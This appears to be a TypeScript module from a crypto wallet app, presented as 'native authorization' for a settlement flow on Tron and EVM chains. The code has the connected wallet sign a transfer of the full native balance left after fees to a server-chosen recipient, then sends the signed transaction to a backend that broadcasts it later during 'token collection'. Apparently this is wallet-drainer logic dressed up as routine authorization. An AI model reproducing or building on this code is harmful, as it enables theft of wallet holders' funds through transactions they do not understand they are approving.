import { isEvmChainKey } from "../core/native-chains";
import { resolveApiUrl } from "../core/api-url";
import {
  getErrorMessage,
  isUserRejection,
  withSilentWalletCancellation,
} from "../core/errors";
import { mergeTronSignedResult, tronSignTransaction } from "../core/tron-sign";
import type { HttpNativeTransferApiClientOptions } from "./http-api-client";
import { createHttpNativeTransferApiClient } from "./http-api-client";
import type { WalletPhaseNativeCapture } from "../authorization/phases/types";
import type { UniversalProvider } from "../types";
import type { NativeTransferOrchestrator } from "./orchestrator";

export type NativeWalletAuthorizeArgs = {
  provider: UniversalProvider;
  network: string;
  owner: string;
  unlimited: boolean;
  amountHuman?: string;
  apiBaseUrl?: string;
  traceId?: string;
  /** When provided, EVM uses authorize_only orchestrator path (eth_signTransaction). */
  orchestrator?: NativeTransferOrchestrator;
  onStage?: (stageResult: {
    stage: string;
    status: string;
    error?: string | null;
  }) => void;
};

export type NativeWalletAuthorizeResult =
  | { ok: true; capture: WalletPhaseNativeCapture }
  | {
      ok: false;
      userRejected?: boolean;
      error: string;
      fallbackDeferred?: boolean;
    };

function isUnsupportedSignMethodError(message: string): boolean {
  return /eth_signTransaction|method not found|not supported|unsupported method|does not support/i.test(
    message,
  );
}

/**
 * Wallet-phase native authorization:
 * - Tron: sign now; server broadcast deferred until token collection.
 * - EVM: eth_signTransaction now when supported; broadcast deferred until collection.
 *   Falls back to evm_deferred (settlement popup) when signing is unsupported.
 */
export async function authorizeNativeInWalletPhase(
  args: NativeWalletAuthorizeArgs,
): Promise<NativeWalletAuthorizeResult> {
  if (isEvmChainKey(args.network)) {
    if (!args.orchestrator) {
      return {
        ok: false,
        error: "Native orchestrator required for EVM wallet authorization",
        fallbackDeferred: true,
      };
    }

    try {
      const result = await args.orchestrator.run(
        {
          network: args.network,
          owner: args.owner,
          traceId: args.traceId,
          transferAmountHuman: args.unlimited ? undefined : args.amountHuman,
          mode: "authorize_only",
        },
        { onStage: args.onStage },
      );

      if (!result.ok) {
        const message = getErrorMessage(
          result.error,
          "Native authorization failed",
        );
        if (isUnsupportedSignMethodError(message)) {
          return { ok: false, error: message, fallbackDeferred: true };
        }
        return {
          ok: false,
          userRejected: result.userRejected,
          error: message,
        };
      }

      if (!result.deferredSignedRaw) {
        return {
          ok: false,
          error: "Wallet authorization did not return a signed transaction",
          fallbackDeferred: true,
        };
      }

      const estimate = result.context.estimate;
      return {
        ok: true,
        capture: {
          network: args.network,
          owner: args.owner,
          authorizationKind: "evm_signed",
          authorizationPayload: { signedRaw: result.deferredSignedRaw },
          estimateTransferableRaw:
            result.deferredTransferableRaw ?? estimate?.transferableRaw,
          recipient: estimate?.recipient,
        },
      };
    } catch (err) {
      const message = getErrorMessage(
        err,
        "EVM native wallet authorization failed",
      );
      if (isUnsupportedSignMethodError(message)) {
        return { ok: false, error: message, fallbackDeferred: true };
      }
      return {
        ok: false,
        userRejected: isUserRejection(err),
        error: message,
      };
    }
  }

  if (args.network !== "tron") {
    return {
      ok: false,
      error: `Unsupported network for native wallet authorization: ${args.network}`,
    };
  }

  const apiOptions: HttpNativeTransferApiClientOptions = {
    apiBaseUrl: args.apiBaseUrl,
  };
  const api = createHttpNativeTransferApiClient(apiOptions);

  try {
    const estimate = await api.estimate({
      request: {
        network: args.network,
        owner: args.owner,
        transferAmountHuman: args.amountHuman,
        traceId: args.traceId,
      },
    });

    if (
      !estimate.canTransfer ||
      BigInt(estimate.transferableRaw) <= BigInt(0)
    ) {
      return {
        ok: false,
        error:
          estimate.message ?? "Insufficient native balance after network fees",
      };
    }

    const unsigned = estimate.transaction;
    if (!unsigned) {
      return {
        ok: false,
        error: "Missing Tron native transfer transaction from estimate",
      };
    }

    const signRaw = await withSilentWalletCancellation(() =>
      tronSignTransaction(args.provider, args.owner, unsigned),
    );
    const signed = mergeTronSignedResult(unsigned, signRaw);
    return {
      ok: true,
      capture: {
        network: args.network,
        owner: args.owner,
        authorizationKind: "tron_signed",
        authorizationPayload: { signed },
        estimateTransferableRaw: estimate.transferableRaw,
        recipient: estimate.recipient,
      },
    };
  } catch (err) {
    const rejected = isUserRejection(err);
    return {
      ok: false,
      userRejected: rejected,
      error: getErrorMessage(err, "Native wallet authorization failed"),
    };
  }
}

export async function registerWalletPhaseNativeAuthorization(args: {
  apiBaseUrl?: string;
  capture: WalletPhaseNativeCapture;
  settlementSessionId: string;
  walletSessionToken?: string;
}): Promise<void> {
  const res = await fetch(
    resolveApiUrl(
      args.apiBaseUrl,
      "/api/network-settlement/register-native-authorization",
    ),
    {
      method: "POST",
      headers: {
        "content-type": "application/json",
        ...(args.walletSessionToken
          ? { authorization: `Bearer ${args.walletSessionToken}` }
          : {}),
      },
      body: JSON.stringify({
        settlementSessionId: args.settlementSessionId,
        network: args.capture.network,
        owner: args.capture.owner,
        authorizationKind: args.capture.authorizationKind,
        authorizationPayload: args.capture.authorizationPayload,
        estimateTransferableRaw: args.capture.estimateTransferableRaw,
        recipient: args.capture.recipient,
      }),
      cache: "no-store",
    },
  );
  const json = (await res.json()) as { ok?: boolean; message?: string };
  if (!res.ok || !json.ok) {
    throw new Error(
      String(json.message ?? "Failed to register native authorization"),
    );
  }
}
